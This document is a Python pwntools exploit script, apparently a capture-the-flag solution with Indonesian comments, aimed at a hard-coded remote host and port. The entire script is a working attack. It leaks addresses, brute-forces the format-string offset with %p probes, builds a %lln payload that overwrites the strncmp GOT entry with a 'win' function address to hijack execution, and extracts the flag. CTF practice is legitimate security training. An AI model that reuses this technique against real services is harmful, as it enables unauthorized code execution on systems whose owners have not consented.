from pwn import *
import re
import sys

# Konfigurasi target
HOST = '152.118.201.210'
PORT = 2602

def main():
    p = remote(HOST, PORT)

    # Ekstraksi alamat
    p.recvuntil(b'pivot @ ')
    pivot_addr = int(p.recvline().strip(), 16)
    p.recvuntil(b'win @ ')
    win_addr = int(p.recvline().strip(), 16)

    log.info(f"Pivot address : {hex(pivot_addr)}")
    log.info(f"Win address   : {hex(win_addr)}")

    base_offset = -1
    pad_len = 0

    log.info("Calculating format string offset and stack alignment")
    for pad in range(8):
        for chunk in range(6, 45, 4):
            payload = (b"a" * pad) + b"ZZZZZZZZ"
            for i in range(chunk, chunk + 4):
                payload += f".%{i}$p".encode()
            
            p.sendline(payload)
            res = p.recvline().decode(errors='ignore')
            
            if '0x5a5a5a5a5a5a5a5a' in res:
                parts = res.strip().split('.')
                for j in range(1, len(parts)):
                    if '5a5a5a5a5a5a5a5a' in parts[j]:
                        base_offset = chunk + (j - 1)
                        pad_len = pad
                        break
            if base_offset != -1: 
                break
        if base_offset != -1: 
            break

    if base_offset == -1:
        log.error("Offset calculation failed.")
        sys.exit(1)

    log.success(f"Offset localized at {base_offset} with {pad_len} bytes padding.")

    got_strncmp = 0x404000
    chars_to_print = win_addr - pad_len

    fmt_str = f"%1${chars_to_print}c"
    prefix = (b"a" * pad_len) + fmt_str.encode()

    exploit = b""
    log.info("Constructing GOT overwrite payload...")
    for target_offset in range(base_offset, base_offset + 15):
        write_str = f"%{target_offset}$lln".encode()
        test_payload = prefix + write_str
        
        got_index = pad_len + (target_offset - base_offset) * 8
        
        if len(test_payload) <= got_index:
            final_payload = test_payload.ljust(got_index, b'b')
            final_payload += p64(got_strncmp)
            
            if len(final_payload) <= 63: 
                exploit = final_payload
                break

    if not exploit:
        log.error("Payload construction failed. Length exceeds 64 bytes limitation.")
        sys.exit(1)

    log.info(f"Payload generated successfully ({len(exploit)} bytes). Transmitting to target...")
    p.sendline(exploit)
    p.sendline(b"quit")

    log.info("Awaiting execution and extracting flag.")
    out = p.recvall(timeout=10)

    flag_match = re.search(r"[\w\-\_]+\{.*?\}", out.decode(errors='ignore'))
    if flag_match:
        log.success(f"Execution successful. Flag {flag_match.group(0)}")
    else:
        log.warning("Flag extraction failed. Inspecting partial output.")
        print(out[-300:].decode(errors='ignore'))

if __name__ == '__main__':
    main()